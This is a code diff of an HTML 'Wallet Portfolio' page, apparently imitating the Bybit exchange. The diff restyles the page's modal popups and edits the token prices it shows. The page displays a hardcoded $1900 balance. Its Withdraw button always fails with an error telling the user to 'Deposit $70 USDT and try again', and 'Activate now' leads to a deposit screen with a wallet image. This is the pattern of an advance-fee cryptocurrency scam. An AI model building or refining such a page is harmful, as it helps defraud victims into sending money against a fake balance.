@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Wallet Portfolio</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Bybit-style background and theme -->
+  <meta name="viewport" content="width=device-width, initial-scale=0.5, maximum-scale=1.0, user-scalable=no">
   <style>
     body {
       background: #131313;
@@ -95,8 +94,6 @@
     .wallet-btn:active {
       filter: brightness(0.93);
     }
-
-    /* GIF Section */
     .gif-section {
       width: 100%;
       max-width: 600px;
@@ -118,8 +115,6 @@
       border-radius: 12px;
       background: #191919;
     }
-
-    /* Token Table */
     .token-table-section {
       width: 100%;
       max-width: 600px;
@@ -157,7 +152,6 @@
     td, th {
       vertical-align: middle;
     }
-    /* Token left, Balance center, Price right */
     th:first-child, td:first-child {
       text-align: left;
       width: 38%;
@@ -170,8 +164,106 @@
       text-align: right;
       width: 30%;
     }
-
-    /* Responsive */
+    /* Modal overlays */
+    .deposit-page,
+    .error-popup-bg {
+      display: flex;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(19,19,19,0.90);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+    .hidden {
+      display: none !important;
+    }
+    .deposit-card {
+      background: #222;
+      border-radius: 18px;
+      padding: 32px 20px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.28);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 320px;
+    }
+    .deposit-card img {
+      width: 150px;
+      height: 150px;
+      object-fit: contain;
+      margin-bottom: 22px;
+      border-radius: 12px;
+      background: #191919;
+      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
+    }
+    .deposit-desc {
+      font-size: 1.16rem;
+      color: #f5c339;
+      margin-bottom: 8px;
+      text-align: center;
+      font-weight: 500;
+    }
+    .deposit-close {
+      margin-top: 20px;
+      padding: 10px 36px;
+      background: #f5c339;
+      color: #222;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .error-popup-bg {
+      background: rgba(0,0,0,0.60);
+      z-index: 200;
+    }
+    .error-popup {
+      background: #232323;
+      color: #f5c339;
+      border-radius: 14px;
+      padding: 32px 20px 20px 20px;
+      box-shadow: 0 2px 24px rgba(245,195,57,0.08);
+      min-width: 320px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+    .error-title {
+      font-size: 1.28rem;
+      font-weight: bold;
+      margin-bottom: 14px;
+      text-align: center;
+    }
+    .error-desc {
+      font-size: 1rem;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    .error-actions {
+      display: flex;
+      gap: 14px;
+      margin-top: 8px;
+    }
+    .error-btn {
+      padding: 9px 30px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 500;
+      background: #f5c339;
+      color: #222;
+      transition: background 0.2s;
+    }
+    .error-btn.secondary {
+      background: #232323;
+      color: #f5c339;
+      border: 1.5px solid #f5c339;
+    }
     @media (max-width: 650px) {
       .main-wrap, .portfolio-section, .gif-section, .token-table-section {
         max-width: 99vw;
@@ -186,6 +278,11 @@
       .gif-section img {
         width: 100vw;
         max-width: 99vw;
+      }
+      .deposit-card, .error-popup {
+        min-width: 90vw;
+        padding-left: 6vw;
+        padding-right: 6vw;
       }
     }
   </style>
@@ -204,12 +301,10 @@
         </div>
       </div>
     </div>
-
     <!-- GIF Section -->
     <div class="gif-section">
       <img src="IMG_0898.gif" alt="Wallet Overview" />
     </div>
-
     <!-- Token Table Section -->
     <div class="token-table-section">
       <table>
@@ -229,30 +324,29 @@
           <tr>
             <td>BTC</td>
             <td>$0.00</td>
-            <td>$105,703.48</td>
+            <td>$68,000</td>
           </tr>
           <tr>
             <td>SOLANA</td>
             <td>$0.00</td>
-            <td>$162.35</td>
+            <td>$160</td>
           </tr>
           <tr>
             <td>BNB</td>
             <td>$0.00</td>
-            <td>$671.28</td>
+            <td>$600</td>
           </tr>
           <tr>
             <td>ETH</td>
             <td>$0.00</td>
-            <td>$2,597.95</td>
+            <td>$3,800</td>
           </tr>
         </tbody>
       </table>
     </div>
   </div>
-
   <!-- Deposit Page Modal -->
-  <div class="deposit-page" id="deposit-modal" style="display:none;">
+  <div class="deposit-page hidden" id="deposit-modal">
     <div class="deposit-card">
       <img src="IMG_1089.jpeg" alt="Deposit Wallet">
       <div class="deposit-desc">Deposit USDT or any supported token to your wallet.</div>
@@ -260,9 +354,8 @@
       <button class="deposit-close" id="deposit-close">Close</button>
     </div>
   </div>
-
   <!-- Error Popup Modal -->
-  <div class="error-popup-bg" id="error-popup-bg" style="display:none;">
+  <div class="error-popup-bg hidden" id="error-popup-bg">
     <div class="error-popup">
       <div class="error-title">Sorry, you can't complete process at this time</div>
       <div class="error-desc">Deposit <b>$70 USDT</b> and try again.</div>
@@ -272,12 +365,8 @@
       </div>
     </div>
   </div>
-  
   <script>
-  // Dynamically update balance to $1900
-  document.getElementById('portfolio-balance-amount').textContent = '$1900';
-  </script>
-  <script>
+    document.getElementById('portfolio-balance-amount').textContent = '$1900';
     const depositBtn = document.getElementById('deposit-btn');
     const withdrawBtn = document.getElementById('withdraw-btn');
     const depositModal = document.getElementById('deposit-modal');
@@ -287,34 +376,33 @@
     const closeErrorBtn = document.getElementById('close-error-btn');
 
     // Deposit button opens deposit modal
-    depositBtn.onclick = function() {
-      depositModal.style.display = 'flex';
+    depositBtn.onclick = function(e) {
+      depositModal.classList.remove('hidden');
     };
     // Withdraw button opens error popup
-    withdrawBtn.onclick = function() {
-      errorPopup.style.display = 'flex';
+    withdrawBtn.onclick = function(e) {
+      errorPopup.classList.remove('hidden');
     };
     // Close deposit modal
-    depositClose.onclick = function() {
-      depositModal.style.display = 'none';
+    depositClose.onclick = function(e) {
+      depositModal.classList.add('hidden');
     };
     // Activate now redirects to deposit modal
-    activateNowBtn.onclick = function() {
-      errorPopup.style.display = 'none';
-      depositModal.style.display = 'flex';
+    activateNowBtn.onclick = function(e) {
+      errorPopup.classList.add('hidden');
+      depositModal.classList.remove('hidden');
     };
     // Close error popup
-    closeErrorBtn.onclick = function() {
-      errorPopup.style.display = 'none';
+    closeErrorBtn.onclick = function(e) {
+      errorPopup.classList.add('hidden');
     };
-
     // Allow clicking outside modal to close
     window.onclick = function(e) {
       if (e.target === depositModal) {
-        depositModal.style.display = 'none';
+        depositModal.classList.add('hidden');
       }
       if (e.target === errorPopup) {
-        errorPopup.style.display = 'none';
+        errorPopup.classList.add('hidden');
       }
     };
   </script>
